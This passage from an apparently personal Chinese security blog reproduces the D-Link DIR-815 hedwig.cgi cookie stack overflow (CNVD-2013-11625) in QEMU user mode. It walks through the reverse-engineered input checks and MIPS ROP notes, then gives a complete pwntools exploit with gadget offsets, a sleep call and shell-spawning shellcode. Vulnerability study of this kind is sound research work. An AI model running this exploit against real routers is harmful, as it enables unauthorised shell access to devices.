+<p>首先<code>v9</code>不能是-1,可以看到只要环境变量<code>REQUEST_URI</code>不为空就可以满足这个条件</p>
+<p>h<img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646228075.png" alt="1749646228075"></p>
+<p>这之后是从内存中取出一块硬编码的字符串和长度整形,和环境变量<code>CONTENT_TYPE</code>做比较,如果相同则可以更加靠近对<code>function_ptr</code>的交叉引用.</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646600274.png" alt="1749646600274"></p>
+<p>可以看到是将<code>CONTENT_TYPE</code>与字符串<code>&quot;application/&quot;</code>,以长度0xc做比较,如果比较成功,则v16&#x3D;1</p>
+<p>接着会以数组<code>(&amp;off_42C014)[3 * v16 - 1])</code>的形式调用<code>(&amp;off_42C014)[2])</code>的函数,这个函数是<code>sub_403B10</code></p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646670357.png" alt="1749646670357"></p>
+<p>a4是<code>&amp;v14[v17]</code>,即<code>CONTENT_TYPE[0xc]</code>,环境变量未被比较的那部分,如果与<code>&quot;x-www-form-urlencoded&quot;</code>相同,则调用<code>sub_402FFC(a1, a2, a3)</code></p>
+<p>按照直觉,这里的比较应该需要成功,因为<code>sub_402FFC(a1, a2, a3)</code>的<code>a1</code>来自于<code>sub_403B10</code>的<code>a1</code>,也就是<code>function_ptr</code></p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646992985.png" alt="1749646992985"></p>
+<p>进入这个函数后,我们没有发现很直接的对<code>function_ptr</code>的交叉引用</p>
+<p>但是调用了<code>sub_402B40</code>,它的参数是对<code>sub_403B10</code>中的<code>int变量</code>的取地址,那么它就有可能会访问到<code>sub_403B10</code>中的其他参数</p>
+<p>我们接着往里面看</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647119695.png" alt="1749647119695"></p>
+<p>终于出现了对函数指针的调用,其中<code>a1</code>就是<code>sub_403B10</code>中的<code>int变量</code>的地址,果然它以此为基址,3为偏移进行了解引用</p>
+<p>此时我们回到<code>sub_403B10</code>中观察几个变量的相对位置,会发现</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647246322.png" alt="1749647246322"></p>
+<p>(&amp;v11)[3]刚刚好就是<code>function_ptr</code>的位置,终于我们找到了<code>function_ptr</code>的交叉引用</p>
+<p>综上只要我们满足了<code>CONTENT_TYPE</code>&#x3D;<code>&quot;application/&quot;</code>+<code>&quot;x-www-form-urlencoded&quot;</code>&#x3D;<code>&quot;application/x-www-form-urlencoded&quot;</code></p>
+<p>就可以对<code>haystack</code>进行赋值,绕过检查</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647476494.png" alt="1749647476494"></p>
+<p>这就是我们最终需要利用的地方了</p>
+<h4 id="3-POST-content内容的检查"><a href="#3-POST-content内容的检查" class="headerlink" title="3.POST_content内容的检查"></a>3.POST_content内容的检查</h4><p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650119014.png" alt="1749650119014"></p>
+<p>在<code>sub_402FFC</code>中有对POST_content的内容的读取,读取后在<code>sub_402B40(&amp;v11, (int)buf, v8)</code>中处理(&#96;POST_content被读入了buf)</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650225521.png" alt="1749650225521"></p>
+<p>这里对<code>POST_content</code>的处理方式与对cookie的处理方式相似,也是初始化了两个结构体,将<code>=</code>前后的内容分别读入两个结构体</p>
+<p>然后判断这两个结构体中的内容是否不为空</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650344608.png" alt="1749650344608"></p>
+<p>所以<code>POST_content</code>必须满足<code>^(.+?)=(.+)$</code></p>
+<h2 id="3-脚本编写"><a href="#3-脚本编写" class="headerlink" title="| 3 | 脚本编写"></a>| 3 | 脚本编写</h2><p>虽然我们可以直接通过IDA分析出溢出长度,但总归用gdb调试一下会更靠谱</p>
+<p>首先我们将0x400个字符a(<code>padding</code>)放入一个payload文件中,然后写一个shell脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;01=pwner&quot;                                        #创建INPUT变量作为POST_content,满足^(.+?)=(.+)$</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)                         #计算$INPUT的长度</span><br><span class="line">cookie=&quot;uid=`cat payload`&quot;                              #将cookie设置为uid=&#123;payload&#125;,payaload中是&#x27;a&#x27;*0x400</span><br><span class="line"></span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ -0 &quot;hedwig.cgi&quot; \       #通过管道符(|)将$INPUT作为POST_context传输给./htdocs/cgibin,并设置agrv[0]=&quot;hedwig.cgi&quot;</span><br><span class="line">  -E REQUEST_METHOD=&quot;POST&quot; \                            #指定请求方式为POST</span><br><span class="line">  -E CONTENT_LENGTH=$LEN \                              #设置LENTH环境变量</span><br><span class="line">  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \ #设置CONTENT_TYPE环境变量为刚刚逆向分析得到的字符串</span><br><span class="line">  -E HTTP_COOKIE=$cookie \                              #设置cookie环境变量为设置好的载荷</span><br><span class="line">  -E REQUEST_URI=&quot;2333&quot; \                               #设置REQUEST_URI环境变量为2333(只要不为空即可)</span><br><span class="line">  -g 1234 \                                             #开发1234端口等待gdb连接</span><br><span class="line">  ./htdocs/cgibin                                       #指定运行的elf为目标文件</span><br></pre></td></tr></table></figure>
+
+<p>此时我们在另一个端口开gdb连接1234端口,即可开始对<code>./htdocs/cgibin</code>进行远程调试</p>
+<p>此时我们进入了调试界面</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749651194872.png" alt="1749651194872"></p>
+<p>这个设备是没有开ALSR保护,所以libc固定,我们想要获取libc可以通过查询已经完成延迟绑定的got表计算libc_base</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749651295789.png" alt="1749651295789"></p>
+<p>将其与libc中free的地址进行相减就可得到<code>libc_base</code></p>
+<p>然后将断点设置在<code>hedwigcgi_main</code>返回时,查看栈溢出情况,最终确定了payload的基本架构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;0&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload+= <span class="comment">#s0</span></span><br><span class="line">payload+= <span class="comment">#s1</span></span><br><span class="line">payload+= <span class="comment">#s2</span></span><br><span class="line">payload+= <span class="comment">#s3</span></span><br><span class="line">payload+= <span class="comment">#s4</span></span><br><span class="line">payload+= <span class="comment">#s5</span></span><br><span class="line">payload+= <span class="comment">#s6</span></span><br><span class="line">payload+= <span class="comment">#s7</span></span><br><span class="line">payload+= <span class="comment">#$fp</span></span><br><span class="line">payload+= <span class="comment">#$ra</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>此处记录一些mips架构的相关知识</p>
+<h5 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h5><p><strong>叶子函数</strong></p>
+<ul>
+<li>当一个函数内部,没有调用其他函数时,这个函数称为<strong>叶子函数</strong></li>
+<li>叶子函数的<strong>返回地址</strong>在被调用时便存储在<code>$ra</code>中,函数返回时 直接通过<code>jr $ra</code>跳回</li>
+</ul>
+<p><strong>非叶子函数</strong></p>
+<ul>
+<li>当一个函数调用了其他函数时,这个函数称为非叶子函数</li>
+<li>非叶子函数的返回地址通过<code>sw</code>被存贮在栈上,在函数返回时会通过<code>lw</code>操作将返回地址弹回<code>$ra</code>,再<code>jr $ra</code>返回</li>
+<li>只有非叶子函数可以通过栈溢出覆盖返回地址</li>
+</ul>
+<p>相似的,如果某些函数在调用过程中使用了<code>$ *</code>寄存器,它也会先通过<code>sw</code>操作将这些寄存器原本的值存在栈上,在返回时<code>lw</code>恢复寄存器的值</p>
+<p>所以通过栈溢出我们不仅可以控制返回地址,还可以控制大量的寄存器</p>
+<h5 id="流水线指令集特性"><a href="#流水线指令集特性" class="headerlink" title="流水线指令集特性"></a>流水线指令集特性</h5><ul>
+<li>在 MIPS 架构中，当你执行一条 <strong>跳转（如 <code>j</code> &#x2F; <code>jalr</code>）或条件分支（如 <code>beq</code> &#x2F; <code>bne</code>）指令</strong>时,**跳转&#x2F;分支发生后，**<em>仍然会执行紧接着的下一条指令（也就是那一行代码！）</em>，<strong>无论是否跳转成功！</strong></li>
+<li>在 MIPS 架构中，由于其支持 <strong><code>数据缓存（D-Cache）</code></strong> 和 <strong><code>指令缓存（I-Cache）</code></strong>，这两个缓存是连个独立的,对内存的映射,当我们将shellcode写入栈中,数据缓存中的内容已经被更新成了我们写入的shellcode,但是指令缓存中的内容仍然是栈中原本的数据,如果此时就跳转会导致shellcode未被执行.保险起见,我们可以调用<code>sleep</code>函数给予这两个缓存足够的时间同步</li>
+</ul>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749655578367.png" alt="1749655578367"></p>
+<h5 id="mips架构下的rop"><a href="#mips架构下的rop" class="headerlink" title="mips架构下的rop"></a>mips架构下的rop</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       mips-32-little</span><br><span class="line">RELRO:      No RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX unknown - GNU_STACK missing</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是这个elf的保护,没有开启NX导致我们可以直接在栈上注入shellcode,但在跳转到shellcode前我们还要写一个ROP,包含了调用sleep使两个缓存同步以及跳转到shellcode上两步</p>
+<h6 id="MIPSROP"><a href="#MIPSROP" class="headerlink" title="MIPSROP"></a>MIPSROP</h6><p>在IDA中有个十分好用的插件:<a target="_blank" rel="noopener" href="https://github.com/zhefox/MipsROPSeracher-python3">mipsrop</a></p>
+<p>比起<code>ROPgadget</code>寻找的速度更快,更灵活</p>
+<p>按照README安装好后,我们进入IDA界面</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749655920775.png" alt="1749655920775"></p>
+<p>先点击这个</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656006390.png" alt="1749656006390"></p>
+<p>再点击这个,此时mipsrop插件启动成功,我们可以在python栏中输入相关语法查找所需的gadget</p>
+<p>我们的调用链为<code>sleep(1)---&gt;shellcode</code></p>
+<p>我们首先需要做的是将<code>$a0</code>设置为<code>1</code></p>
+<p>此时使用以下指令寻找</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656432964.png" alt="1749656432964"></p>
+<p>可以找到将<code>$a0</code>设置为<code>1</code>的gadget,同时可以通过<code>$s0</code>继续跳转,由于我们可以控制大量的寄存器,所以我们仍然能通过控制<code>$s0</code>继续控制<code>执行流</code></p>
+<p>接下来我们就要调用sleep函数了,不过我们不能直接跳转过去,因为我们还没有设置返回地址(<code>$ra</code>),我们需要寻找到一段能控制<code>$ra</code>且不能通过<code>$ra</code>进行跳转的gadget,将<code>ROP</code>布置在<code>$ra</code>中才能使执行流一直得到控制</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656790077.png" alt="1749656790077"></p>
+<p>我们可以通过<code>$s2</code>控制程序流,同时也可以控制<code>$ra</code>,我们将<code>$s2</code>设置为<code>sleep</code>的地址,在调用<code>sleep</code>时<code>$ra</code>会被<code>sw</code>在栈上</p>
+<p>此时内存缓冲与指令缓冲同步完毕,我们需要将执行流跳转到栈上,此时的gadget可以通过<code>mipsrop.stackfinder</code>寻找</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749657013799.png" alt="1749657013799"></p>
+<p>此时的<code>$s0</code>变成了栈上的地址,我们只需要通过调试在<code>payload</code>中合适的位置填充上shellcode,并寻找一个能跳转到<code>$s0</code>的gadget就可以执行<code>shellcode</code>了</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749657152912.png" alt="1749657152912"></p>
+<p>由于本题使用的溢出函数是<code>sprintf</code>,存在<code>\x00</code>截断,所以shellcode可以直接使用pwntools生成的mips.sh()</p>
+<h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="| 4 | EXP"></a>| 4 | EXP</h2><h3 id="qemu-usr"><a href="#qemu-usr" class="headerlink" title="qemu-usr"></a>qemu-usr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">base=<span class="number">0x3ff38000</span></span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">shellcode =asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload =<span class="string">b&#x27;0&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload+=p32(<span class="number">0x407ffc08</span>)   <span class="comment">#s0</span></span><br><span class="line">payload+=p32(base+<span class="number">0x3B8A8</span>) <span class="comment">#s1: (move $t9,$s2;lw $ra, 0x24($sp);lw $s1,0x20($sp);lw $s0,0x1c($sp);jr $t9)</span></span><br><span class="line">payload+=p32(base+<span class="number">0x56BD0</span>) <span class="comment">#s2: sleep</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment">#s3</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment">#s4</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment">#s5</span></span><br><span class="line">payload+=p32(base+<span class="number">0x530C8</span>) <span class="comment">#s6: (move $t9, $s0;jalr $t9)</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment">#s7</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment">#$fp</span></span><br><span class="line">payload+=p32(base+<span class="number">0x57E50</span>) <span class="comment">#$ra: (li $a0, 1;move $t9, $s1;jalr $t9)</span></span><br><span class="line"><span class="comment">#===============================================================================</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload+=p32(<span class="number">0x407ffc08</span>)*<span class="number">3</span></span><br><span class="line">payload+=p32(base+<span class="number">0x25604</span>)<span class="comment">#(addiu $s0, $sp,0x110;move $t9, $s6;jalr $t9)</span></span><br><span class="line"><span class="comment">#===============================================================================</span></span><br><span class="line"></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">0xec</span>-<span class="number">4</span>)+shellcode</span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+payload</span><br><span class="line"></span><br><span class="line">post_content = <span class="string">b&quot;zer00ne==pwner&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">io = process(b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    -g 1234 \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;, shell=True)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;aa&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>顺利开启shell</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749716261430.png" alt="1749716261430"></p>
+<h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><p>[正在施工]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">iot漏洞复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/as.jpg" data-sizes="auto" alt="" class="lazyload">
+        
+      
+      <a href="/2025/06/02/nctf/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          (no title)
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        20.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:27
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DIR-815-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">DIR-815 栈溢出漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%87%86%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">| 0 | 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">| 1 | 固件提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">| 2 | 逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">条件绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%B7%AF%E5%BE%84%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1.路径检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2.全局变量检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9cgibin-parse-request%E9%80%BB%E8%BE%91%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">对cgibin_parse_request逻辑的分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-POST-content%E5%86%85%E5%AE%B9%E7%9A%84%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3.POST_content内容的检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | 脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.0.0.1.</span> <span class="toc-text">函数特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%8C%87%E4%BB%A4%E9%9B%86%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.0.0.2.</span> <span class="toc-text">流水线指令集特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mips%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84rop"><span class="toc-number">1.5.0.0.3.</span> <span class="toc-text">mips架构下的rop</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MIPSROP"><span class="toc-number">1.5.0.0.3.1.</span> <span class="toc-text">MIPSROP</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">| 4 | EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-usr"><span class="toc-number">1.6.1.</span> <span class="toc-text">qemu-usr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-system"><span class="toc-number">1.6.2.</span> <span class="toc-text">qemu-system</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
